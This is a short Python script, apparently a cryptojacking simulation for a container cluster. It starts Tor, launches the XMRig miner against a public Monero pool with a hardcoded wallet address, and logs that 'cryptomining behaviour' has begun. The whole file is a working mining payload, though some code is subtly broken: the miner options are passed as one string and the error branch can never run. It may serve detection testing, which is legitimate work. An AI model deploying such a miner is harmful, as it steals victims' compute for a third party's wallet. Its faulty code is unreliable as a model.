import subprocess
import logging
import time

# ready = ensure_ready_probe(misconfigs)
pool = "pool.supportxmr.com:5555"
wallet = "49FzQ7CxFxLQsYNHnGJ8CN1BgJaBvr2FGPEiFVcbJ7KsWDRzSxyN8Sq4hHVSYehjPZLpGe26cY8b7PShd7yxtZcrRjz6xdT"

subprocess.call(['service', 'tor', 'start'])
subprocess.call(['/xmrig/build/xmrig', '--url={} --donate-level=3 --user={} --pass=docker -k --coin=monero'.format(pool, wallet)])

while True:
    logging.info("Cryptomining behaviour started in cluster")
    time.sleep(30)
else:
    logging.error("Cryptomining behaviour could not be started")